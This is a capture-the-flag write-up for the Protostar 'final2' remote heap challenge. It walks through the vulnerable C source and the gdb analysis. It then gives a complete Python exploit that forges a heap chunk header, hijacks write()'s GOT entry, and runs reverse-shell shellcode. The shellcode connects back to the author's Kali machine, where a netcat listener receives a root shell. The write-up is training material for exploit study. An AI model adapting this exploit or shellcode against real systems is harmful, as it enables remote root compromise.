#### Protostar Final2 

##### About
Remote heap level :)  
  
Core files will be in /tmp.  
  
This level is at /opt/protostar/bin/final2

##### Source code
```c
#include "../common/common.c"
#include "../common/malloc.c"

#define NAME "final2"
#define UID 0
#define GID 0
#define PORT 2993

#define REQSZ 128

void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
          "yes" : "no", start - buf);
      }
  }
}

int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;

  dll = 0;
  while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);     

      dll++;
  }

  for(i = 0; i < dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  get_requests(fd);

}
```

I do find JMP ESP in final2 with using msfelfscan, but final2 is heap vulnerable. ╮(╯_╰)╭

##### Solution
There are something different between the provided source code and the binary.

```
root@protostar:/opt/protostar/bin# gdb final2
......
(gdb) disas get_requests
......
0x0804bd60 <+25>:   movl   $0x1,0x4(%esp)
0x0804bd68 <+33>:   movl   $0x80,(%esp)
0x0804bd6f <+40>:   call   0x804b4ee <calloc>        ; <-- calloc(REQSZ, 1);
0x0804bd74 <+45>:   mov    %eax,-0x14(%ebp)
0x0804bd77 <+48>:   mov    -0x10(%ebp),%eax
0x0804bd7a <+51>:   mov    -0x14(%ebp),%edx
0x0804bd7d <+54>:   lea    %edx,-0x414(%ebp,%eax,4)  ; <-- destroylist[dll] = buf;
......
```

There is an assignment statement of destroylist[i] which is missing in the provided source code. And the printf() in the check_path() is not called in the binary.  
  
Besides these differences, we should notice that our request is read by 128 bytes each time, and a chunk is allocated for this 128 bytes each reading.

In this challenge, the vulnerability is not a BOF, it happens in check_path(). It assumes that in our request there is an '/' character before string "ROOT", and then performs a memmove().  
  
What about there no '/' before string "ROOT"? The operation **"while(*start != '/') start--"** will make pointer "start" point to the previous chunk. It means that we can counterfeit a chunk header by exploit this operetion and memmove(). Then perform a free() attack like what we do in heap3.

```python
import socket

s = socket.socket()
s.connect(("192.168.56.101",2993))

chunk_A = "FSRD" + "A"*123 + "/"

s.sendall(chunk_A)

chunk_B_header = "\xfc\xff\xff\xff" + "\xfe\xff\xff\xff" + "BBBB" + "CCCC"

chunk_B = "FSRD" + "ROOT" + "A"*(128-9-len(chunk_B_header)) + "/" + chunk_B_header

s.sendall(chunk_B)

s.close()
```

Use the script above to find out the details to exploit this program. 

```
root@protostar:/opt/protostar/bin# ps -ef | grep final2
root      1354     1  0 05:13 ?        0:00 /opt/protostar/bin/final2
root      1697  1468  0 08:21 tty1     0:00 grep final2

root@protostar:/opt/protostar/bin# gdb final2 -p 1354
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) break *get_requests+155
Breakpoint 1 at 0x804bde2: file final2/final2.c, line 53.
(gdb) break *free+301
Breakpoint 2 at 0x804aaef: file final2/../common/malloc.c, line 3648.
(gdb) c
Continuing.
[New process 1752]
[Switching to process 1752]

Breakpoint 1, get_requests (fd=4) at final2/final2.c:53
(gdb) x/4x $ebp-0x414
0xbffff844:     0x0804e008      0x0804e090      0x0804e118      0xb7ea1a54
(gdb) x/8x 0x0804e008-8
0x0804e000:     0x00000000      0x00000089      0x44525346      0x41414141
0x0804e010:     0x41414141      0x41414141      0x41414141      0x41414141
(gdb) x/8x 0x0804e090-8
0x0804e088:     0xfffffffe      0xfffffffc      0x42424242      0x43434343  ; <-- counterfeit header
0x0804e098:     0x41414141      0x41414141      0x41414141      0x41414141
(gdb) c
Continuing.

Breakpoint 2, 0x0804aaef in free (mem=0x0804e008)
(gdb) x $edx
0x43434343      cannot access memory at address 0x43434343
(gdb) x $eax
0x42424242      cannot access memory at address 0x42424242
```

Seems it's working, then just think about where to write our shellcode address, note that write() is called after free().

```
root@protostar:/opt/protostar/bin# objdump -R final2 | grep write
0804d41c R_386_JUMP_SLOT   write
```

Just make a little caculation and complete the payload with the old trick used in heap3.

```python
import socket

#http://www.shell-storm.org/shellcode/files/shellcode-883.php
shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89" \
"\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x38\x66\x66\x68\x05\x39\x43" \
"\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59" \
"\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68" \
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

s = socket.socket()
s.connect(("192.168.56.101",2993))

chunk_A = "FSRD" + "\x90"*4 + "\x68\x30\xe0\x04\x08\xc3"          # push 0x0804e030; ret
chunk_A = chunk_A + "\x90"*(128-19-len(shellcode)) + shellcode    # 0x0804e030 hits nop
chunk_A = chunk_A + "\x90"*4 + "/"                                # last 4 nops ensure shellcode 
                                                                  # will not be modified by free()

s.sendall(chunk_A)

chunk_B_header = "\xfe\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x10\xd4\x04\x08" + "\x10\xe0\x04\x08"

chunk_B = "FSRD" + "ROOT" + "A"*(128-9-len(chunk_B_header)) + "/" + chunk_B_header

s.sendall(chunk_B)

s.close()
```

And I listen to port 1337 in my Kali.

```
root@Kali: ~# nc -l -p 1337
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-final/#final2>  
<http://www.kroosec.com/2013/01/protostar-final2.html>
